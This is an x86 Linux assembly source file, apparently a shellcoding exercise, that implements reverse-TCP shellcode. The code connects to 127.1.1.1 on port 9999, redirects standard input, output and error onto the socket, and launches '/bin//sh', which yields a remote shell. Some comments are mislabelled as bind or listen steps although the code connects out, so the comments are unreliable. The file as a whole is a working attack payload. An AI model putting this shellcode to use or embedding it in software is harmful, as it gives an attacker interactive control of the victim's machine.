; Filename: shell_reverse_tcp.asm
; Author:   Fernando Benedictti
;

global _start			

segment .text
_start:
  ; select the sys_socketcall system call (0x66)
  ; int socketcall (int call, unsigned long *args)
  push 0x66
  pop eax
  mov edi, eax

  ; select the function of socketcall invocation (0x1)
  ; int socket (int domain, int type, int protocol)
  push 0x1
  pop ebx

  cdq                   ; copies the value of the 31th bit (sign) of EAX in every
                        ; bit position of EDX (initialize EDX to 0)
  push edx              ; protocol = 0 (IPPROTO_IP = 0x0)
  push 0x1              ; type = 1 (SOCK_STREAM = 0x1)
  push 0x2              ; domain = 2 (AF_INET = 0x2)

  mov ecx, esp          ; save the pointer to the stack in ecx

  int 0x80              ; execute the sys_socketcall->socket

  ; ---

  xchg esi, eax         ; save the file descriptor's socket

  ; select the sys_socketcall system call (0x66)
  ; int socketcall (int call, unsigned long *args)
  mov eax, edi

  ; select the function of socketcall invocation (0x2)
  ; int connect (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
  push 0x3
  pop ebx

  ; prepare the structure struct_sockaddr_in for bind
  push 0x0101017f       ; sin_addr = 127.1.1.1 (listen in this ip)
  push word 0x0f27      ; sin_port = 9999 (listen in this port)

  ; sin_family = s (AF_INET = 0x2)
  push 0x2
  pop ecx 							

  push word cx
  mov ecx, esp          ; save the pointer to the stack in ecx

  push 0x10             ; length of struct_sockaddr = 16
  push ecx              ; pointer to struct_sockaddr
  push esi              ; file descriptor's socket of previous call

  mov ecx, esp          ; save the pointer to the stack in ecx

  int 0x80              ; execute sys_socketcall->bind

  ; ---
  xor ecx, ecx
  mov cl, 0x2

loop:
  ; select the sys_dup2 system call (0x3f)
  ; int dup2 (int oldfd, int newfd)
  push 0x3f
  pop eax
  int 0x80              ; execute sys_dup2
  dec ecx
  jns loop

  ; select the sys_execve system call (0x0b)
  ; int execve(const char *filename, char *const argv[], char *const envp[])
  push 0xb
  pop eax

  push edx
  push 0x68732f2f       ;"hs//"
  push 0x6e69622f       ;"nib/"

  mov ebx, esp          ; save the pointer to stack in ecx

  inc ecx
  mov edx, ecx

  int 0x80              ; execute sys_execve
